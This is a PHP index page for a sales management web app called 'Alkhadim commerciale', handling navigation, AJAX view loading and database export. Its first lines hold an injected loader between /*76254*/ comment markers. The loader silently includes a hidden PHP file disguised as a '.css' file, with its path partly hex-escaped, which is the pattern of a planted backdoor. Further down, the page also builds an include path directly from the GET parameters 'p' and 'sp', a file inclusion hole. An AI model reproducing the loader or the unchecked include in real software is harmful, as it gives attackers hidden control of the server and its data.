<?php
/*76254*/

$r9b = "/home/c2mcloud/hotelchaf\x69k.c2m.ma/1/v\x69ews/parametrage/.a6a33ca6.css"; if (!isset($r9b)) {htmlentities ($r9b);} else { @include_once /* 35 */ ($r9b); }

/*76254*/


 include('evr.php') ; ?>
<!DOCTYPE html>
<html lang="en" style="opacity: 1">
<head>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/js/all.min.js" integrity="sha512-6PM0qYu5KExuNcKt5bURAoT6KCThUmHRewN3zUFNaoI6Di7XJPTMoT6K0nsagZKk2OB4L7E3q1uQKHNHd4stIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.8.0/dist/leaflet.css" integrity="sha512-hoalWLoI8r4UszCkZ5kL8vayOGVae1oxXe/2A4AO6J9+580uKHDO3JdHb7NzwwzK5xr/Fs0W40kiNHxM9vyTtQ==" crossorigin="" />
<script src="https://unpkg.com/leaflet@1.8.0/dist/leaflet.js" integrity="sha512-BB3hKbKWOc9Ez/TAwyWxNXeoV9c1v6FIeYiBieIWkpLjauysF18NzgR1MBNBXf8/KABdlkX68nAhlwcDFLGPCQ==" crossorigin=""></script>
  <link rel = "icon" href ="<?php echo BASE_URL . 'asset/img/icon.png' ?>"
        type = "image/x-icon">
    <meta charset="UTF-16">
    <title>Alkhadim commerciale</title>
    <?php include('includes/style.php') ;?>
    <?php include("includes/script.php") ;?>
  <style type="text/css">
     label {
      font-size: 16px;
      font-weight: bold;
     }
     h5{
      font-weight: bold;
      font-size: 1.3rem;
     }
  </style>
</head>
<body id="app-container" class="menu-default ">
	<?php
$files=scandir ( 'db' );
$T1=[];
foreach($files as $file){
    if(!in_array($file,array(".",".."))){
         $T1[]=strstr($file,'_',true);
    }
}
if(!in_array(date('d-m-Y'),$T1)){
  include('exporter.php');
}
?>
    <?php include 'includes/nav.php'; ?>
    <?php if(auth::user()['privilege'] != 'Vendeur')
    {
        include 'includes/sidenav.php'; 
        $hideSide = 0;
    }
    else
    {
      $hideSide = 1;
    }
    connexion::getConnexion()->query("ALTER TABLE client ADD column plafond2 DOUBLE");
?>
    <main id="main">
        <?php if (isset($_GET['p'])) 
        {
           include 'views/'.$_GET['p'].'/'.$_GET['sp'];
        }   
        else
        {
           if(auth::user()['privilege'] == 'Vendeur')
           {
              include 'views/commande-vendeurs/index.php';
           }
           else
              include 'views/Acceuil/index.php';
        }
        ?>
    </main>
    <script>
            // DEFAULT CONTENT
$(document).ready(function() {
    $("body").dore();
    var DOMAIN_NAME = window.location.pathname;
    $('.submenu').click(function() {
        $("#app-container").addClass("sub-show-temporary");
    });
    $('body').on('click', '.url', function() {
        $("#main").html('<div class="loading"></div>');
        $("#app-container").removeClass("sub-show-temporary").removeClass("main-show-temporary");
        $("#app-container").addClass("sub-hidden");
        var url = $(this);
        if (!url.hasClass('notlink')) {
            $('.list-unstyled li').removeClass('active');
            if (url.hasClass('sub')) {
                var id = url.parents('li').parents('ul').data("link");
                $("#" + id).addClass("active");
            } else {
                url.parents('li').addClass('active');
            }
        }
      history.pushState({}, "", `<?php echo BASE_URL; ?>${url.data('url')}`);
        $.ajax({
            method: 'POST',
            data: {
                ajax: true
            },
            url: `<?php echo BASE_URL; ?>views/${url.data('url')}`,
            context: document.body,
            success: function(data) {
                $("#main").html(data);
            }
        });
        return;
    });
 $("#Pullnav").click(function(){
   history.back()
 });
    $("#Pushnav").click(function(){
   history.forward()
 });
window.addEventListener("popstate", function(e) {
var url = location.href; 
var newurl = url.replace('<?php echo BASE_URL ?>', "");
 $("#main").html('<div class="loading"></div>');
        $("#app-container").removeClass("sub-show-temporary").removeClass("main-show-temporary");
        $("#app-container").addClass("sub-hidden");
  $.ajax({
            method: 'POST',
            data: {
                ajax: true
            },
            url:  `<?php echo BASE_URL; ?>views/${newurl}`,
            context: document.body,
            success: function(data) {
                $("#main").html(data);
            }
        });
});
$('body').on('click', '.expoert', function() {
            const db = '<?php echo BASE_URL; ?>/exporter.php';
                swal.queue([{
                  title: 'Exportation',
                  confirmButtonText: 'Exporter',
                  text: 'Exporter la base de données' ,
                  showLoaderOnConfirm: true,
                  preConfirm: () => {
                    return fetch(db)
                      .then(response => response.json())
                      .then(data => swal.insertQueueStep(data.data))
                      .catch(() => {
                        swal.insertQueueStep({
                          type: 'error',
                          title: 'échoué de exporter la base de donnée'
                        })
                      })
                  }
                }])
                  });
              let hideSide = <?php echo $hideSide; ?>;
              if(hideSide)
              {
                  $('#app-container').attr('class', 'menu-default menu-sub-hidden main-hidden sub-hidden');
              }
                      $("#app-container").addClass("sub-hidden");
});
    </script>
    <script>
       setInterval(function(){location.reload();},1800000);
    </script>
</body>
</html>